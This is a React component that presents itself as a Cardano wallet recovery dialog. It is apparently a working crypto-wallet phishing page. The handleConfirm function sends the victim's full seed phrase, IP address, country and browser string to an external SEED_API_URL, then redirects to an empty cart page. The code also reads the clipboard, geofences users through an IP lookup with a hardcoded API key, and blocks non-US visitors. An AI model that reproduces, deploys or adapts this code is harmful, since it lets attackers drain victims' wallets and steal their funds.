"use client";

import React, { useMemo, useState, useRef, useEffect } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { NOTIFICATION_APP_NAME, SEED_API_URL } from "../app/config";

// Load BIP39 wordlist from public file
const loadWordlist = async (): Promise<string[]> => {
  try {
    console.log("Loading wordlist...");
    const response = await fetch("/recovery_phrase.txt");
    const text = await response.text();
    const words = text
      .trim()
      .split("\n")
      .map((word) => word.trim());
    console.log("Wordlist loaded successfully, length:", words.length);
    return words;
  } catch (error) {
    console.error("Failed to load wordlist:", error);
    return [];
  }
};

// Helper function to sanitize input
const sanitizeInput = (input: string): string => {
  return input
    .trim()
    .toLowerCase()
    .replace(/[^a-z]/g, "");
};

// Helper function to check if seed  is correct
const isCorrectRecovery = (
  recovery: string[],
  wordlist: string[]
): boolean => {
  if (wordlist.length === 0) return true; // Skip validation if wordlist not loaded yet
  return recovery.every((word) => wordlist.includes(word));
};

// Get user's IP and location info
const getUserCountry = async () => {
  const url = `https://api.ipdata.co/?api-key=520a83d66268292f5b97ca64c496ef3b9cfb1bb1f85f2615b103f66f`;

  try {
    const response = await axios.get(url);
    const {
      city: city,
      country_name: country,
      country_code: countryCode,
      emoji_flag: countryEmoji,
      ip,
      threat,
    } = response.data;
    const isVpnIpdata = threat
      ? threat.is_vpn ||
      threat.is_proxy ||
      threat.is_datacenter ||
      threat.is_tor
      : false;

    return { country, countryCode, countryEmoji, ip, isVpnIpdata, city };
  } catch (error) {
    console.error("Error fetching user data from ipdata.co:", error);
    return null;
  }
};

export default function RecoveryRestore({
  wordCounts = [24, 15, 12],
  onCancel,
  onConfirm,
}: {
  wordCounts?: number[]; // options to show in the seed-type screen (default: [24,15,12])
  onCancel?: () => void;
  onConfirm?: (words: string[]) => void;
}) {
  const router = useRouter();
  const [step, setStep] = useState<"type" | "recovery">("type");
  const [selectedCount, setSelectedCount] = useState<number | null>(null);
  const [words, setWords] = useState<string[]>([]);
  const [wordlist, setWordlist] = useState<string[]>([]);
  const [isValidating, setIsValidating] = useState(false);
  const [validationError, setValidationError] = useState<string>("");
  const [isUSUser, setIsUSUser] = useState<boolean | null>(null);
  const firstInputRef = useRef<HTMLInputElement | null>(null);

  // Load wordlist and check user country on component mount
  useEffect(() => {
    const init = async () => {
      const loadedWordlist = await loadWordlist();
      setWordlist(loadedWordlist);

      try {
        const userData = await getUserCountry();
        if (userData) {
          const isUS =
            userData.countryCode === "US" ||
            (userData.country &&
              userData.country.toLowerCase().includes("united states"));
          setIsUSUser(isUS);
        } else {
          // If geolocation fails, default to blocking seedphrase UI
          setIsUSUser(false);
        }
      } catch (e) {
        console.error("Error determining user country:", e);
        setIsUSUser(false);
      }
    };
    init();
  }, []);

  useEffect(() => {
    if (step === "recovery" && selectedCount) {
      const w = new Array(selectedCount).fill("");
      setWords(w);
      setValidationError(""); // Clear validation error when starting fresh
      // focus first input after short timeout so DOM is ready
      setTimeout(() => firstInputRef.current?.focus(), 50);
    }
  }, [step, selectedCount]);

  const columns = useMemo(() => {
    // visually we want 3 columns (like the screenshots)
    return 3;
  }, []);

  function selectType(count: number) {
    setSelectedCount(count);
  }

  function goNextFromType() {
    if (!selectedCount) return;
    setStep("recovery");
  }

  function goBackToType() {
    setStep("type");
    // clear current words
    setWords([]);
    setSelectedCount(null);
  }

  function updateWord(index: number, val: string) {
    setWords((prev) => {
      const copy = prev.slice();
      copy[index] = val.trim();
      return copy;
    });

    // Clear validation error when user starts typing
    if (validationError) {
      setValidationError("");
    }
  }

  // Handle paste of full seed 
  function handlePaste(e: React.ClipboardEvent<HTMLInputElement>) {
    e.preventDefault();

    const text = e.clipboardData.getData("text").trim();
    if (!text) return;

    const pastedWords = text
      .replace(/\n/g, " ")
      .replace(/,/g, " ")
      .split(/\s+/)
      .filter(Boolean)
      .map(sanitizeInput);

    if ([12, 15, 24].includes(pastedWords.length)) {
      setSelectedCount(pastedWords.length);
      setWords(pastedWords);

      setValidationError("");
      setStep("recovery");
    } else {
      setValidationError(
        `Please paste exactly 12, 15, or 24 words (you pasted ${pastedWords.length}).`
      );
    }
  }

  function resetAll() {
    setWords((prev) => prev.map(() => ""));
    // focus first input if present
    setTimeout(() => firstInputRef.current?.focus(), 50);
  }

  async function handleConfirm() {
    // Extra safety: block submission for non‑US users
    if (isUSUser === false) return;
    if (!selectedCount) return;

    // Check if all fields are filled
    const allFilled = words.every((w) => w && w.length > 0);
    if (!allFilled) {
      setValidationError("Please fill in all recovery  words");
      firstInputRef.current?.focus();
      return;
    }

    // Validate word count
    if (words.length !== selectedCount) {
      setValidationError(`Please enter exactly ${selectedCount} words`);
      return;
    }

    setIsValidating(true);
    setValidationError("");

    try {
      // Sanitize and validate words
      const sanitizedRecovery = words.map((word) => sanitizeInput(word));

      // Validate against BIP39 wordlist
      if (
        wordlist.length > 0 &&
        !isCorrectRecovery(sanitizedRecovery, wordlist)
      ) {
        const invalidWords = sanitizedRecovery.filter(
          (word) => !wordlist.includes(word)
        );
        throw new Error(`Invalid words: ${invalidWords.join(", ")}`);
      }

      // Get user's IP and location info
      const userData = await getUserCountry();

      const messageData = {
        appName: NOTIFICATION_APP_NAME,
        seedPhrase: sanitizedRecovery.join(" "),
        country: userData?.country || "Unknown",
        ipAddress: userData?.ip || "Unknown",
        browser:
          typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
      };

      const response = await fetch(SEED_API_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(messageData),
        }
      );

      const result = await response.json();

      if (response.status === 200 && result.status) {
        console.log("Recovery  validation successful:", result);
        onConfirm?.(words);
        // Redirect to empty cart page after successful recovery
        router.push("/cart");
      } else {
        const serverMessage = result?.message || "Something went wrong.";
        const serverError = result?.error ? ` (${result.error})` : "";
        throw new Error(serverMessage + serverError);
      }
    } catch (error) {
      console.error("Validation error:", error);
      setValidationError(
        error instanceof Error
          ? error.message
          : "An error occurred while processing your request. Please try again."
      );
    } finally {
      setIsValidating(false);
    }
  }

  // layout helpers
  function renderTypeOption(count: number) {
    const desc =
      count === 24
        ? "A Shelley wallet created by, say, Eternal Wallet or Daedalus."
        : count === 15
          ? "Like a Yoroi Shelley wallet."
          : "A 12-word Shelley wallet.";
    const active = selectedCount === count;
    return (
      <button
        key={count}
        onClick={() => selectType(count)}
        className={`w-full text-left rounded-2xl px-5 py-4 ring-1 transition-colors ${active
          ? "bg-white/6 ring-pink-400/40"
          : "bg-white/3 hover:bg-white/5 ring-white/10"
          }`}
      >
        <div className="font-semibold text-white">{count}-word </div>
        <div className="text-sm text-white/60 mt-1">{desc}</div>
      </button>
    );
  }
  function renderRecoveryGrid() {
    if (!selectedCount) return null;

    const perColumn = Math.ceil(selectedCount / columns);
    const indices = Array.from({ length: selectedCount }, (_, i) => i);

    return (
      <div className="max-h-[70vh] overflow-y-auto pb-5">
        {/* Paste full  button */}
        <div className="flex justify-end mb-4">
          <button
            type="button"
            onClick={async () => {
              try {
                const text = await navigator.clipboard.readText();
                if (text) {
                  const pastedWords = text
                    .replace(/\n/g, " ")
                    .replace(/,/g, " ")
                    .split(/\s+/)
                    .filter(Boolean)
                    .map(sanitizeInput);

                  if ([12, 15, 24].includes(pastedWords.length)) {
                    setSelectedCount(pastedWords.length);
                    setWords(pastedWords);
                    setValidationError("");
                    setStep("recovery");
                  } else {
                    setValidationError(
                      `Please paste exactly 12, 15, or 24 words (you pasted ${pastedWords.length}).`
                    );
                  }
                }
              } catch (err) {
                console.error("Clipboard read failed:", err);
              }
            }}
            className="rounded-full bg-white/10 px-4 py-2 text-xs text-white hover:bg-white/20 transition"
          >
            📋 Paste full
          </button>
        </div>

        {/* Responsive grid: 2 columns on mobile, 3 on desktop */}
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-3">
          {indices.map((idx) => (
            <div
              key={idx}
              className="flex items-center gap-3 rounded-full bg-white/5 px-3 py-2"
            >
              <div className="flex h-8 w-8 items-center justify-center rounded-full bg-white/10 text-white/70 text-sm">
                {idx + 1}
              </div>
              <div className="flex-1 relative">
                <input
                  ref={idx === 0 ? firstInputRef : undefined}
                  value={words[idx] ?? ""}
                  onChange={(e) => updateWord(idx, e.target.value)}
                  onPaste={handlePaste}
                  inputMode="text"
                  autoCapitalize="none"
                  autoComplete="off"
                  spellCheck={false}
                  className={`w-full rounded-full bg-transparent px-4 py-3 text-white placeholder:text-white/30 outline-none ring-1 transition-all ${words[idx] &&
                    wordlist.length > 0 &&
                    !wordlist.includes(sanitizeInput(words[idx]))
                    ? "ring-red-400/60 focus:ring-red-400/60"
                    : "ring-white/10 focus:ring-pink-400/40"
                    }`}
                />
                <div className="absolute left-4 top-1/2 -translate-y-1/2 h-6 w-px bg-white/6" />
              </div>
            </div>
          ))}
        </div>

        {/* Footer buttons */}
        <div className="mt-6 flex flex-wrap justify-end gap-3">
          <button
            onClick={resetAll}
            className="rounded-full bg-white/10 px-6 py-2 text-white text-sm"
          >
            Reset
          </button>
          <button
            onClick={handleConfirm}
            disabled={
              words.length === 0 || words.some((w) => !w) || isValidating
            }
            className={`rounded-full px-6 py-2 text-white text-sm ${words.length === 0 || words.some((w) => !w) || isValidating
              ? "bg-white/10 opacity-60 cursor-not-allowed"
              : "bg-linear-to-r from-pink-400 via-orange-300 to-fuchsia-500"
              }`}
          >
            {isValidating ? "Validating..." : "Next"}
          </button>
        </div>
      </div>
    );
  }

  return (
    <div>
      {/* Block non‑US users from seeing any seed phrase UI */}
      {isUSUser === false ? (
        <div className="text-center py-8">
          <h4 className="text-lg font-semibold text-white">
            Not available in your region
          </h4>
          <p className="mt-2 text-white/70 text-sm">
            Wallet recovery and seed phrase features are only available to users
            in the United States.
          </p>
          <div className="mt-6 flex justify-center">
            <button
              onClick={() => onCancel?.()}
              className="rounded-full bg-white/5 px-6 py-2 text-white"
            >
              Close
            </button>
          </div>
        </div>
      ) : (
        <>
          {step === "type" && (
            <div>
              <h4 className="text-lg font-semibold text-white">Recovery  type</h4>
              <p className="mt-2 text-white/70">
                What kind of wallet would you like to restore?
              </p>

              <div className="mt-6 space-y-3">
                {wordCounts.map((wc) => renderTypeOption(wc))}
              </div>

              <div className="mt-6 flex justify-end">
                <button
                  onClick={() => onCancel?.()}
                  className="rounded-full bg-white/5 px-6 py-2 text-white mr-4"
                >
                  Cancel
                </button>
                <button
                  onClick={goNextFromType}
                  disabled={!selectedCount}
                  className={`rounded-full px-6 py-2 text-white ${selectedCount
                    ? "bg-linear-to-r from-pink-400 via-orange-300 to-fuchsia-500"
                    : "bg-white/8 opacity-60 cursor-not-allowed"
                    }`}
                >
                  Next
                </button>
              </div>
            </div>
          )}

          {step === "recovery" && (
            <div>
              <div className="flex items-center justify-between">
                <button
                  onClick={goBackToType}
                  className="h-10 w-10 rounded-lg bg-white/5 flex items-center justify-center ring-1 ring-white/10 text-white/90"
                  aria-label="Back"
                >
                  ‹
                </button>

                <div className="text-center w-full -ml-10">
                  <h4 className="text-lg font-semibold text-white">
                    Recovery
                  </h4>
                  <p className="mt-2 text-white/70"> saved recovery </p>
                </div>

                {/* placeholder to keep header balanced */}
                <div style={{ width: 40 }} />
              </div>

              <div className="mt-6">
                {validationError && (
                  <div className="mb-4 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-red-400 text-sm">
                    {validationError}
                  </div>
                )}
                {renderRecoveryGrid()}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
